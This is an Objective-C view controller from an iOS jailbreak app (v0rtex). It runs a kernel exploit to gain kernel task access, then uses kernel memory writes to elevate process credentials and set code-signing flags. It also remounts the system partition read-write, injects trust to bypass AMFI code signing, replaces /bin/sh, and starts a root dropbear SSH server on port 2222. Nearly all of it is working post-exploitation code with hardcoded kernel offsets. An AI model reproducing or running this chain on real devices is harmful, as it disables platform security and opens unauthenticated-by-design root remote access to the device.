//
//  ViewController.m
//  v0rtex
//
//  Created by Sticktron on 2017-12-07.
//  Copyright © 2017 Sticktron. All rights reserved.
//

#import "ViewController.h"

#include "v0rtex.h"
#include "kernel.h"
#include "symbols.h"
#include "root-rw.h"
#include "libjb.h"
#include "patchfinder64.h"
#include "v0rtex.h"
#include "amfi.h"
#include <sys/spawn.h>
#include <sys/stat.h>
#include <CommonCrypto/CommonDigest.h>
#include <mach-o/loader.h>
#include <sys/dir.h>
#include <sys/utsname.h>
#define OSDictionary_ItemCount(dict) rk32(dict+20)
#define OSDictionary_ItemBuffer(dict) rk64(dict+32)
#define OSDictionary_ItemKey(buffer, idx) rk64(buffer+16*idx)
#define OSDictionary_ItemValue(buffer, idx) rk64(buffer+16*idx+8)
#define OSString_CStringPtr(str) rk64(str+0x10)
typedef mach_port_t io_connect_t;
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);

#define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER            0x0000008    /* has installer entitlement      */
#define CS_HARD                 0x0000100    /* don't load invalid pages       */
#define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
#define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *outputView;
@property (weak, nonatomic) IBOutlet UIButton *sploitButton;
@end

@implementation ViewController

task_t tfp0;
kptr_t kslide;
kptr_t kern_ucred;
kptr_t self_proc;

mach_port_t user_client = MACH_PORT_NULL;

static uint64_t kalloc(vm_size_t size){
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfp0, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}

uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
    
    uint64_t offx20 = rk64(fake_client+0x40);
    uint64_t offx28 = rk64(fake_client+0x48);
    wk64(fake_client+0x40, x0);
    wk64(fake_client+0x48, addr);
    uint64_t returnval = IOConnectTrap6(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
    wk64(fake_client+0x40, offx20);
    wk64(fake_client+0x48, offx28);
    return returnval;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.sploitButton.layer.cornerRadius = 8;
    [self.sploitButton setTitleColor:UIColor.darkGrayColor forState:UIControlStateDisabled];
    
    self.outputView.layer.cornerRadius = 6;
    self.outputView.text = nil;
    
    // print kernel version
    struct utsname u;
    uname(&u);
    [self writeText:[NSString stringWithFormat:@"%s \n", u.version]];
     
    // init offsets
    if (init_symbols()) {
        [self writeText:@"Ready. \n"];
    } else {
        [self writeText:@"❌ Device/OS not supported."];
        self.sploitButton.enabled = NO;
    }
}

- (IBAction)runSploitButton:(UIButton *)sender {
    [self writeText:@"> exploiting kernel..."];
    
    tfp0 = MACH_PORT_NULL;
    kslide = 0;
    kern_ucred = 0;
    self_proc = 0;
    
	
    
    /* Use v0rtex exploit */
    
    kern_return_t ret = v0rtex(&tfp0, &kslide, &kern_ucred, &self_proc);
    if (ret != KERN_SUCCESS) {
        LOG("v0rtex exploit failed");
        [self writeText:@"ERROR: exploit failed \n"];
        return;
    }
	
    self.sploitButton.enabled = NO;
    [self writeText:@"exploit succeeded ✅ \n"];
	
    LOG("tfp0 -> %x", tfp0);
    LOG("slide -> 0x%llx", kslide);
    LOG("self_proc -> 0x%llx", self_proc);
    LOG("kern_ucred -> 0x%llx", kern_ucred);
    
    
    /* Set up patchfinder and stuff */
    
    init_patchfinder(tfp0, kslide + 0xFFFFFFF007004000, NULL);
    init_amfi(tfp0);
    init_kernel(tfp0);
    
    uint32_t our_pid = getpid();
    uint64_t our_proc = 0;
    uint64_t kern_proc = 0;
    uint64_t amfid_proc = 0;
    uint32_t amfid_pid = 0;
    uint64_t fake_client = kalloc(0x1000);
    
    uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
    while (proc)
    {
        uint32_t pid = (uint32_t)rk32(proc + OFFSET_PROC_P_PID);
        char name[40] = {0};
        kread(proc+0x268, name, 20);
        if (pid == our_pid)
        {
            our_proc = proc;
        }
        else if (pid == 0)
        {
            kern_proc = proc;
        }
        else if (strstr(name, "amfid"))
        {
            printf("found amfid - getting task\n");
            amfid_proc = proc;
            amfid_pid = pid;
            uint32_t csflags = rk32(proc + OFFSET_P_CSFLAGS);
            wk32(proc + OFFSET_P_CSFLAGS, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
        }
        if (pid != 0) {
            uint32_t csflags = rk32(proc + OFFSET_P_CSFLAGS);
            printf("CSFlags for %s (PID: %d): 0x%x; ", name, pid, csflags);
            
            cpu_type_t cputype = rk32(proc + OFFSET_P_CPUTYPE);
            cpu_subtype_t cpusubtype = rk32(proc + OFFSET_P_CPU_SUBTYPE);
            
            printf("\tCPU Type: 0x%x. Subtype: 0x%x\n", cputype, cpusubtype);
            
            uint64_t ucreds = rk64(proc + OFFSET_PROC_UCRED);
            uint64_t amfi_entitlements = rk64(rk64(ucreds + 0x78) + 0x8);
            printf("\tAMFI Entitlements at 0x%llx\n", amfi_entitlements);
            
            uint64_t textvp = rk64(proc + OFFSET_P_TEXTVP); //vnode of executable
            off_t textoff = rk64(proc + OFFSET_P_TEXTOFF);
            
            printf("\t__TEXT at 0x%llx. Offset: 0x%llx\n", textvp, textoff);
            
            if (textvp != 0){
                uint32_t vnode_type_tag = rk32(textvp + OFFSET_V_TYPE);
                uint16_t vnode_type = vnode_type_tag & 0xffff;
                uint16_t vnode_tag = (vnode_type_tag >> 16);
                printf("\tVNode Type: 0x%x. Tag: 0x%x.\n", vnode_type, vnode_tag);
                
                if (vnode_type == 1){
                    uint64_t ubcinfo = rk64(textvp + OFFSET_V_UBCINFO);
                    printf("\t\tUBCInfo at 0x%llx.\n", ubcinfo);
                    
                    uint64_t csblobs = rk64(ubcinfo + OFFSET_UBCINFO_CSBLOBS);
                    while (csblobs != 0){
                        printf("\t\t\tCSBlobs at 0x%llx.\n", csblobs);
                        
                        cpu_type_t csblob_cputype = rk32(csblobs + OFFSET_CSB_CPUTYPE);
                        unsigned int csblob_flags = rk32(csblobs + OFFSET_CSB_FLAGS);
                        off_t csb_base_offset = rk64(csblobs + OFFSET_CSB_BASE);
                        uint64_t csb_entitlements = rk64(csblobs + OFFSET_CSB_ENTITLEMENTS);
                        unsigned int csb_signer_type = rk32(csblobs + OFFSET_CSB_SIGNER_TYPE);
                        unsigned int csb_platform_binary = rk32(csblobs + OFFSET_CSB_PLATFORM_BINARY);
                        unsigned int csb_platform_path = rk32(csblobs + OFFSET_CSB_PLATFORM_PATH);
                        
                        printf("\t\t\tCSBlob CPU Type: 0x%x. Flags: 0x%x. Offset: 0x%llx\n", csblob_cputype, csblob_flags, csb_base_offset);
                        
                        printf("\t\t\tCSBlob Signer Type: 0x%x. Platform Binary: %d Path: %d\n", csb_signer_type, csb_platform_binary, csb_platform_path);
                        
                        printf("\t\t\t\tEntitlements at 0x%llx.\n", csb_entitlements);
                        
                        for (int idx = 0; idx < OSDictionary_ItemCount(csb_entitlements); idx++) {
                            uint64_t key = OSDictionary_ItemKey(OSDictionary_ItemBuffer(csb_entitlements), idx);
                            uint64_t keyOSStr = OSString_CStringPtr(key);
                            size_t length = kexecute(user_client, fake_client, 0xFFFFFFF00709BDE0+kslide, keyOSStr, 0, 0, 0, 0, 0, 0);
                            char* s = (char*)calloc(length+1, 1);
                            kread(keyOSStr, s, length);
                            printf("\t\t\t\t\tEntitlement: %s\n", s);
                            free(s);
                        }
                        
                        csblobs = rk64(csblobs);
                    }
                }
            }
        }
        proc = rk64(proc);
    }
    
    
    
    /* Remount system partition as r/w */
    
    int remount = mount_root(tfp0, kslide);
    if (remount != 0) {
        LOG("failed to remount /");
        [self writeText:@"ERROR: failed to remount system partition \n"];
        return;
    }
    [self writeText:@"remounted system partition as r/w ✅"];
    
    /* Install payload */
    
    [self writeText:@"installing payload"];
    {
        NSFileManager *fileMgr = [NSFileManager defaultManager];
        NSString *bundlePath = [NSString stringWithFormat:@"%s", bundle_path()];
        
        // cleanup leftovers
        [fileMgr removeItemAtPath:@"/v0rtex" error:nil];
        [fileMgr removeItemAtPath:@"/bin/sh" error:nil];
        LOG("removed old payload files");
        
        // create dirs for v0rtex
        mkdir("/v0rtex", 0777);
        mkdir("/v0rtex/bins", 0777);
        mkdir("/v0rtex/logs", 0777);
        
        // create dirs and files for dropbear
        //    mkdir("/etc", 0777);
        mkdir("/etc/dropbear", 0777);
        //    mkdir("/var", 0777);
        //    mkdir("/var/log", 0777);
        FILE *lastLog = fopen("/var/log/lastlog", "ab+");
        fclose(lastLog);
        
        // copy files from bundle
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bootstrap.tar"]
                         toPath:@"/v0rtex/bootstrap.tar" error: nil];

        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/tar"]
                         toPath:@"/v0rtex/tar" error:nil];
        
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bash"]
                         toPath:@"/bin/sh" error:nil];
        
        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear"]
                         toPath:@"/v0rtex/dropbear" error:nil];
        
        // grant permissions
        chmod("/v0rtex/tar", 0777);
        chmod("/bin/sh", 0777);
        chmod("/v0rtex/dropbear", 0777);
        LOG("granted some permission");
        
        // fuck up amfi
        inject_trust("/v0rtex/tar");
        inject_trust("/bin/sh");
        inject_trust("/v0rtex/dropbear");
        LOG("fucked up amfi");
        
        // extract payload
        execprog(0, "/v0rtex/tar", (const char **)&(const char*[]){ "/v0rtex/tar", "-xf", "/v0rtex/bootstrap.tar", "-C", "/v0rtex", NULL });
        LOG("un-tarred payload");
        
        // trust files in payload
        trust_files("/v0rtex/bins");
        [self writeText:@"trusted payload binaries"];
        
        // create bash profiles with our bin path
        if (![fileMgr fileExistsAtPath:@"/var/mobile/.profile"]) {
            [fileMgr createFileAtPath:@"/var/mobile/.profile" contents:[[NSString stringWithFormat:@"export PATH=$PATH:/v0rtex/bins"] dataUsingEncoding:NSASCIIStringEncoding] attributes:nil];
        }
        if (![fileMgr fileExistsAtPath:@"/var/root/.profile"]) {
            [fileMgr createFileAtPath:@"/var/root/.profile" contents:[[NSString stringWithFormat:@"export PATH=$PATH:/v0rtex/bins"] dataUsingEncoding:NSASCIIStringEncoding] attributes:nil];
        }
        
        // leave a footprint ;)
        FILE *f = fopen("/.installed_v0rtex", "w");
        fclose(f);
        
        // no stashing please !!!
        FILE *f2 = fopen("/.cydia_no_stash", "w");
        fclose(f2);
    }
    
    
    /* Launch dropbear */
    
    [self writeText:@"launching dropbear"];
    
    execprog(kern_ucred, "/v0rtex/bins/dropbear", (const char**)&(const char*[]){
        //"/v0rtex/dropbear", "-R", "-E", "-m", "-S", "/", NULL
        "/v0rtex/dropbear", "-R", "-E", "-m", "-p2222", NULL
    });
    
    [self writeText:@"* dropbear should now be running on port 2222"];
    [self writeText:@"* to connect:ssh -p2222 root@{YOUR_DEVICE_IP}"];
    [self writeText:@"\n"];
    
    /* The End. */
    
    [self writeText:@"All done, peace!"];
}

- (void)writeText:(NSString *)text {
    self.outputView.text = [NSString stringWithFormat:@"%@%@ \n", self.outputView.text, text];
}

// creds to stek on this one
int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
    if (args == NULL) {
        args = (const char **)&(const char*[]){ prog, NULL };
    }
    
    const char *logfile = [NSString stringWithFormat:@"/v0rtex/logs/%@-%lu",
                           [[NSMutableString stringWithUTF8String:prog] stringByReplacingOccurrencesOfString:@"/" withString:@"_"],
                           time(NULL)].UTF8String;
    printf("Spawning [ ");
    for (const char **arg = args; *arg != NULL; ++arg) {
        printf("'%s' ", *arg);
    }
    printf("] to logfile [ %s ] \n", logfile);
    
    int rv;
    posix_spawn_file_actions_t child_fd_actions;
    if ((rv = posix_spawn_file_actions_init (&child_fd_actions))) {
        perror ("posix_spawn_file_actions_init");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_addopen (&child_fd_actions, STDOUT_FILENO, logfile,
                                                O_WRONLY | O_CREAT | O_TRUNC, 0666))) {
        perror ("posix_spawn_file_actions_addopen");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_adddup2 (&child_fd_actions, STDOUT_FILENO, STDERR_FILENO))) {
        perror ("posix_spawn_file_actions_adddup2");
        return rv;
    }
    
    pid_t pd;
    if ((rv = posix_spawn(&pd, prog, &child_fd_actions, NULL, (char**)args, NULL))) {
        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
        return rv;
    }
    
    printf("process spawned with pid %d \n", pd);
    
    
    /*
     1. read 8 bytes from proc+0x100 into self_ucred
     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
     3. write 12 zeros to self_ucred + 0x18
     */
    
    // find_allproc will crash, currently
    // please fix
    if (kern_ucred != 0) {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
            while (proc) {
                uint32_t pid = rk32(proc + 0x10);
                if (pid == pd) {
                    uint32_t csflags = rk32(proc + 0x2a8);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(proc + 0x2a8, csflags);
                    tries = 0;

                    // i don't think this bit is implemented properly
                    uint64_t self_ucred = rk64(proc + 0x100);
                    uint32_t selfcred_temp = rk32(kern_ucred + 0x78);
                    wk32(self_ucred + 0x78, selfcred_temp);

                    for (int i = 0; i < 12; i++) {
                        wk32(self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                    }

                    printf("gave elevated perms to pid %d \n", pid);

                    // original stuff, rewritten above using v0rtex stuff
                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(proc);
            }
        }
    }
    
    int status;
    waitpid(pd, &status, 0);
    printf("'%s' exited with %d (sig %d)\n", prog, WEXITSTATUS(status), WTERMSIG(status));
    
    char buf[65] = {0};
    int fd = open(logfile, O_RDONLY);
    if (fd == -1) {
        perror("open logfile");
        return 1;
    }
    
    printf("contents of %s: \n ------------------------- \n", logfile);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
    remove(logfile);
    
    return 0;
}

int execprog_clean(uint64_t kern_ucred, const char *prog, const char* args[]) {
    if (args == NULL) {
        args = (const char **)&(const char*[]){ prog, NULL };
    }
    
    int rv;
    pid_t pd;
    if ((rv = posix_spawn(&pd, prog, NULL, NULL, (char**)args, NULL))) {
        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
        return rv;
    }
    
    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
    
    /*
     1. read 8 bytes from proc+0x100 into self_ucred
     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
     3. write 12 zeros to self_ucred + 0x18
     */
    
    if (kern_ucred != 0) {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            // this needs to be moved to an offset VVVVVVVVVVVVV
            uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
            while (proc) {
                uint32_t pid = rk32(proc + 0x10);
                if (pid == pd) {
                    uint32_t csflags = rk32(proc + 0x2a8);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(proc + 0x2a8, csflags);
                    tries = 0;
                    
                    // i don't think this bit is implemented properly
                    uint64_t self_ucred = rk64(proc + 0x100);
                    uint32_t selfcred_temp = rk32(kern_ucred + 0x78);
                    wk32(self_ucred + 0x78, selfcred_temp);
                    
                    for (int i = 0; i < 12; i++) {
                        wk32(self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                    }
                    
                    // original stuff, rewritten above using v0rtex stuff
                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(proc);
            }
        }
    }
    
    int status;
    waitpid(pd, &status, 0);
    return status;
}

void read_file(const char *path) {
    char buf[65] = {0};
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        perror("open path");
        return;
    }
    
    printf("contents of %s: \n ------------------------- \n", path);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
}

char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);
    
    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
    
    return path;
}

@end
